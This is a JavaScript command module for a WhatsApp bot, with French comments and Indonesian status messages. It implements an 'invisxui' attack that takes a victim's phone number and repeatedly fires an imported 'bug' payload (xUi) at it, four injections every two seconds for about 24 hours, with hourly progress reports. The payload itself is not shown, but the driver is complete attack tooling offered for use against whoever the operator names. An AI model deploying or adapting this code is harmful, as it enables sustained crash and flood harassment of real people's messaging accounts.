import { xUi } from "../xUi.js"; // ton module xUi intact

// Fonction de pause
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Commande invisxui - exécutions en "batches" (plusieurs injections toutes les X)
export default {
  name: "invisxui",
  description: "Exécute le bug Invisxui en batches pour que l'exécution dure ~24h",
  async execute(sock, m, args) {
    const prefix = ".";
    const q = args.join(" ");
    
    if (!q) {
      return await sock.sendMessage(
        m.key.remoteJid,
        { text: `Contoh: ${prefix}invisxui 237xxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const pureTarget = target.split("@")[0];

    // --- CONFIGURATION (modifie si nécessaire) ---
    const batchSize = 4;        // nombre d'injections par exécution (par batch)
    const intervalMs = 2000;    // pause entre chaque batch (ms)
    const injectionGapMs = 100; // pause entre injections dans un même batch (ms)

    // Durée souhaitée (ici 24 heures)
    const totalDurationMs = 24 * 60 * 60 * 1000; // = 86 400 000 ms

    // Calcul du temps approximatif par batch (injections + interval)
    const perBatchTimeMs = (batchSize * injectionGapMs) + intervalMs;

    // Calcul dynamique du nombre de batches pour atteindre ~24h
    let totalBatches = Math.ceil(totalDurationMs / perBatchTimeMs);

    // Garde-fous : éviter un nombre absurde/illimité (change si tu sais ce que tu fais)
    const MAX_BATCHES = 200000; // plafond raisonnable (ajuste si besoin)
    if (totalBatches > MAX_BATCHES) totalBatches = MAX_BATCHES;

    // Fréquence d'envoi des messages d'update : on envoie environ toutes les heures
    const updateEveryBatches = Math.max(1, Math.floor((60 * 60 * 1000) / perBatchTimeMs)); // 1 heure

    // ------------------------------------------------

    const prosesText = `╔═══════════════════
║  📡 Mengirim bug Invisxui
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mulai mengirim...
║ Durée cible: 24 heures
╚═══════════════════`;

    // Image URL à ajouter (initial + final)
    const imageUrl = "https://files.catbox.moe/4185go.jpg";

    // Message initial (avec image + caption)
    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: prosesText
      },
      { quoted: m }
    );

    for (let batch = 0; batch < totalBatches; batch++) {
      // Exécution d'un batch : plusieurs injections rapides
      for (let i = 0; i < batchSize; i++) {
        try {
          await xUi(sock, target); // appel de ta fonction importée
        } catch (err) {
          console.error(`Erreur Invisxui - batch ${batch + 1} injection ${i + 1}:`, err.message || err);
        }
        // Petite pause entre injections du même batch pour éviter overlap
        await sleep(injectionGapMs);
      }

      // Message d'update optionnel toutes les X batches (ici ~1 heure)
      if ((batch + 1) % updateEveryBatches === 0) {
        const elapsedBatches = batch + 1;
        const elapsedMs = elapsedBatches * perBatchTimeMs;
        const percent = Math.min(100, Math.round((elapsedMs / totalDurationMs) * 100));
        await sock.sendMessage(
          m.key.remoteJid,
          { text: `Progress: batch ${elapsedBatches}/${totalBatches} (${percent}%) envoyé pour wa.me/${pureTarget}` },
          { quoted: m }
        );
      }

      // Attendre l'intervalle avant le batch suivant (sauf après le dernier)
      if (batch < totalBatches - 1) {
        await sleep(intervalMs);
      }
    }

    const selesaiText = `╔═══════════════════
║  ✅ Bug Invisxui Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Semua batches dikirim
║ Note: Ajuste batchSize/interval si perlu
╚═══════════════════`;

    // Message final (avec image + caption)
    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: selesaiText
      },
      { quoted: m }
    );
  }
};